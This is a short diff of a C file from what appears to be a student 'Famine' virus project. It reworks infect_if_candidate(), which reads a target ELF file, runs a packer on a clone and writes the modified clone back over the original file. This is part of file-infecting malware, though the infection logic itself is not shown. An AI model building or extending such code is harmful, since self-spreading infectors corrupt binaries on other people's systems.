@@ -6,12 +6,13 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:37:20 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/05 01:13:08 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/06 04:55:22 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#include <sys/stat.h>
 #include "infect.h"
+#include "syscall.h"
+#include "accessors.h"
 
 static inline void	set_endian(struct endians_pointer *endians, bool big_mode)
 {
@@ -49,15 +50,15 @@ inline void		infect_if_candidate(const char *file)
 
 	famine_close(fd);
 
-	food.original_safe = read_file(file);
+	food.original_safe = original_accessor(file);
 	if (food.original_safe.ptr == NULL) return;
 
-	food.clone_safe = alloc_clone(food.original_safe.filesize);
+	food.clone_safe = clone_accessor(food.original_safe.filesize);
 	if (food.clone_safe.ptr == NULL) return;
-s
-	elf64_packer(food, food.original_safe.filesize);
-	write_clone_file(food.clone_safe);
 
-	free_clone(food.clone_safe);
-	free_file(food.original_safe);
+	elf64_packer(food, food.original_safe.filesize);
+	write_clone_file(food.clone_safe, file);
+
+	free_accessor(food.clone_safe);
+	free_accessor(food.original_safe);
 }
